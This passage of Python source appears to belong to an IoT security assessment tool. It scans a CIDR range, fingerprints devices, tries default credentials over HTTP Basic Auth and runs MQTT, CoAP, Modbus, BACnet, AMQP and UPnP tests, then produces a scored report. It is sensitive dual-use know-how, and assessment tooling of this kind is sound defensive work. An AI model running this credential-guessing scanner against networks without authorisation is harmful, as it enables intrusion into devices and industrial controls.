            o2 = (addr_int >> 16) & 0xFF
            o3 = (addr_int >> 8) & 0xFF
            o4 = addr_int & 0xFF
            hosts.append(f"{o1}.{o2}.{o3}.{o4}")

        return hosts

    def discover_devices(self, target_range: str,
                          ports: Optional[List[int]] = None) -> List[IoTDevice]:
        """
        Discover IoT devices in a target range.

        Scans the given CIDR range or single host for common IoT ports,
        then fingerprints each responding host.
        """
        self._scan_start = time.time()
        hosts = self._parse_cidr(target_range)
        devices: List[IoTDevice] = []

        logger.info("Discovering devices in %s (%d hosts)", target_range, len(hosts))

        for host in hosts:
            open_ports = self._fingerprinter.discover_ports(host, ports)
            if open_ports:
                device = self._fingerprinter.fingerprint_host(host, open_ports)
                devices.append(device)
                logger.info("Discovered: %s (%s %s) ports=%s",
                           host, device.vendor, device.category.name, open_ports)

        with self._lock:
            self._devices = devices

        logger.info("Discovery complete: %d devices found", len(devices))
        return devices

    def scan_default_creds(self, devices: Optional[List[IoTDevice]] = None,
                            ) -> List[IoTFinding]:
        """
        Test default credentials against discovered devices.

        For each device, looks up vendor-specific and generic credentials
        from the DefaultCredDB and attempts authentication.
        """
        if devices is None:
            devices = self._devices

        findings: List[IoTFinding] = []

        for device in devices:
            # Get vendor-specific credentials
            creds = self._cred_db.get_credentials_for_vendor(device.vendor)
            if not creds:
                creds = self._cred_db.get_credentials_for_category("unknown")

            for cred in creds:
                username = cred["username"]
                password = cred["password"]

                # Test HTTP authentication
                for port in device.open_ports:
                    if port in (80, 443, 8080, 8443):
                        success = self._test_http_auth(
                            device.ip_address, port, username, password
                        )
                        if success:
                            finding = IoTFinding(
                                finding_type=FindingType.DEFAULT_CRED,
                                severity=Severity.CRITICAL,
                                title=(
                                    f"Default Credentials: {device.vendor} "
                                    f"{username}/{password}"
                                ),
                                description=(
                                    f"Device {device.ip_address} ({device.vendor} "
                                    f"{device.model}) accepts default credentials "
                                    f"'{username}:{password}' on port {port}."
                                ),
                                target=device.ip_address,
                                port=port,
                                protocol=IoTProtocol.HTTP,
                                evidence=f"HTTP auth accepted: {username}:{password}",
                                remediation="Change default credentials immediately.",
                                cvss_score=9.8,
                                confidence=1.0,
                            )
                            findings.append(finding)
                            device.findings.append(finding)
                            device.credentials_found.append((username, password))

        with self._lock:
            self._findings.extend(findings)

        logger.info("Default credential scan complete: %d findings", len(findings))
        return findings

    def _test_http_auth(self, host: str, port: int,
                         username: str, password: str) -> bool:
        """Test HTTP Basic Authentication."""
        try:
            import base64
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))

            cred_b64 = base64.b64encode(
                f"{username}:{password}".encode()
            ).decode()

            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Authorization: Basic {cred_b64}\r\n"
                "Connection: close\r\n"
                "\r\n"
            )
            sock.sendall(request.encode())
            response = sock.recv(4096).decode("utf-8", errors="replace")
            sock.close()

            # Check for success (200 OK, 301/302 redirect)
            if response.startswith("HTTP/"):
                status_line = response.split("\r\n")[0]
                status_code = int(status_line.split()[1])
                return status_code in (200, 301, 302, 303, 307, 308)

        except (OSError, ConnectionError, ValueError, IndexError):
            pass

        return False

    def test_mqtt(self, host: str, port: int = MQTT_DEFAULT_PORT) -> List[IoTFinding]:
        """Run MQTT tests against a specific broker."""
        logger.info("Testing MQTT on %s:%d", host, port)
        findings = self._mqtt.full_test(host, port)
        with self._lock:
            self._findings.extend(findings)
        return findings

    def test_coap(self, host: str, port: int = COAP_DEFAULT_PORT) -> List[IoTFinding]:
        """Run CoAP tests against a specific endpoint."""
        logger.info("Testing CoAP on %s:%d", host, port)
        findings = self._coap.full_test(host, port)
        with self._lock:
            self._findings.extend(findings)
        return findings

    def test_upnp(self) -> List[IoTFinding]:
        """Run UPnP discovery and tests on the local network."""
        logger.info("Testing UPnP on local network")
        findings = self._upnp.full_test()
        with self._lock:
            self._findings.extend(findings)
        return findings

    def test_modbus(self, host: str, port: int = MODBUS_DEFAULT_PORT,
                     unit_id: int = 1) -> List[IoTFinding]:
        """Run Modbus tests against a specific device."""
        logger.info("Testing Modbus on %s:%d unit=%d", host, port, unit_id)
        findings = self._modbus.full_test(host, port, unit_id)
        with self._lock:
            self._findings.extend(findings)
        return findings

    def test_bacnet(self, host: str, port: int = BACNET_DEFAULT_PORT,
                     device_instance: int = 0) -> List[IoTFinding]:
        """Run BACnet tests against a specific device."""
        logger.info("Testing BACnet on %s:%d instance=%d", host, port, device_instance)
        findings = self._bacnet.full_test(host, port, device_instance)
        with self._lock:
            self._findings.extend(findings)
        return findings

    def test_amqp(self, host: str, port: int = AMQP_DEFAULT_PORT) -> List[IoTFinding]:
        """Run AMQP tests against a specific broker."""
        logger.info("Testing AMQP on %s:%d", host, port)
        findings = self._amqp.full_test(host, port)
        with self._lock:
            self._findings.extend(findings)
        return findings

    def _auto_test_device(self, device: IoTDevice) -> List[IoTFinding]:
        """Automatically run protocol-specific tests based on open ports."""
        findings: List[IoTFinding] = []

        for port in device.open_ports:
            if port in (1883, 8883):
                findings.extend(self._mqtt.full_test(device.ip_address, port))
            elif port == 5683:
                findings.extend(self._coap.full_test(device.ip_address, port))
            elif port == 502:
                findings.extend(self._modbus.full_test(device.ip_address, port))
            elif port == 47808:
                findings.extend(self._bacnet.full_test(device.ip_address, port))
            elif port == 5672:
                findings.extend(self._amqp.full_test(device.ip_address, port))

        device.findings.extend(findings)
        return findings

    def generate_report(self) -> IoTReport:
        """Generate a comprehensive IoT security assessment report."""
        self._scan_end = time.time()

        with self._lock:
            all_findings = list(self._findings)
            all_devices = list(self._devices)

        # Count severities
        critical = sum(1 for f in all_findings if f.severity == Severity.CRITICAL)
        high = sum(1 for f in all_findings if f.severity == Severity.HIGH)
        medium = sum(1 for f in all_findings if f.severity == Severity.MEDIUM)
        low = sum(1 for f in all_findings if f.severity == Severity.LOW)
        info = sum(1 for f in all_findings if f.severity == Severity.INFO)

        # Protocol stats
        proto_stats: Dict[str, int] = defaultdict(int)
        for f in all_findings:
            proto_stats[f.protocol.name] += 1

        # Vendor stats
        vendor_stats: Dict[str, int] = defaultdict(int)
        for d in all_devices:
            if d.vendor:
                vendor_stats[d.vendor] += 1

        # Category stats
        cat_stats: Dict[str, int] = defaultdict(int)
        for d in all_devices:
            cat_stats[d.category.name] += 1

        # Risk score (0-100)
        risk_score = min(100.0, (
            critical * 25.0 + high * 15.0 + medium * 8.0 +
            low * 3.0 + info * 0.5
        ))

        # Executive summary
        summary_parts: List[str] = [
            f"IoT Security Assessment completed in "
            f"{self._scan_end - self._scan_start:.1f} seconds.",
            f"Discovered {len(all_devices)} devices with "
            f"{len(all_findings)} findings.",
        ]
        if critical > 0:
            summary_parts.append(
                f"CRITICAL: {critical} critical findings require immediate attention."
            )
        if high > 0:
            summary_parts.append(
                f"HIGH: {high} high-severity findings should be addressed urgently."
            )
        summary = " ".join(summary_parts)

        report = IoTReport(
            scan_start=self._scan_start,
            scan_end=self._scan_end,
            target_range="",
            devices_discovered=len(all_devices),
            total_findings=len(all_findings),
            critical_count=critical,
            high_count=high,
            medium_count=medium,
            low_count=low,
            info_count=info,
            devices=all_devices,
            findings=all_findings,
            protocol_stats=dict(proto_stats),
            vendor_stats=dict(vendor_stats),
            category_stats=dict(cat_stats),
            risk_score=risk_score,
            executive_summary=summary,
        )

        logger.info(
            "Report generated: %d devices, %d findings, risk=%.1f "
            "(C:%d H:%d M:%d L:%d I:%d)",
            len(all_devices), len(all_findings), risk_score,
            critical, high, medium, low, info,
        )

        return report

    def run_full_assessment(self, target_range: str,
                             ports: Optional[List[int]] = None) -> IoTReport:
        """
        Run a complete IoT security assessment.

        1. Discover devices via port scanning and fingerprinting
        2. Test default credentials against all devices
        3. Run protocol-specific tests (MQTT, CoAP, Modbus, BACnet, AMQP)
        4. Run UPnP discovery on the local network
        5. Generate comprehensive report
        """
        logger.info("Starting full IoT assessment on %s", target_range)
        self._scan_start = time.time()

        # 1. Device discovery
        devices = self.discover_devices(target_range, ports)

        # 2. Default credential scan
        self.scan_default_creds(devices)

        # 3. Protocol-specific tests for each device
        for device in devices:
            self._auto_test_device(device)

        # 4. UPnP network scan
        self.test_upnp()

        # 5. Generate report
        report = self.generate_report()
        report.target_range = target_range

        return report

    def get_findings(self) -> List[IoTFinding]:
        """Return all findings."""
        with self._lock:
            return list(self._findings)

    def get_devices(self) -> List[IoTDevice]:
        """Return all discovered devices."""
        with self._lock:
            return list(self._devices)

    def get_sub_engine(self, protocol: IoTProtocol) -> Any:
        """Get a specific sub-engine by protocol."""
        engine_map = {
            IoTProtocol.MQTT: self._mqtt,
            IoTProtocol.COAP: self._coap,
            IoTProtocol.UPNP: self._upnp,
            IoTProtocol.MODBUS: self._modbus,
            IoTProtocol.BACNET: self._bacnet,
            IoTProtocol.AMQP: self._amqp,
        }
        return engine_map.get(protocol)

    def to_dict(self) -> Dict[str, Any]:
        """Serialize engine state."""
        with self._lock:
            return {
                "devices": [d.to_dict() for d in self._devices],
                "findings": [f.to_dict() for f in self._findings],
                "total_devices": len(self._devices),
                "total_findings": len(self._findings),
                "scan_start": self._scan_start,
                "scan_end": self._scan_end,
                "sub_engines": {
                    "fingerprinter": self._fingerprinter.to_dict(),
                    "cred_db": {
                        "total_credentials": self._cred_db.credential_count(),
                        "vendors": self._cred_db.vendor_list(),
                    },
                    "mqtt": self._mqtt.to_dict(),
                    "coap": self._coap.to_dict(),
                    "upnp": self._upnp.to_dict(),
                    "modbus": self._modbus.to_dict(),
                    "bacnet": self._bacnet.to_dict(),
                    "amqp": self._amqp.to_dict(),
                },
            }
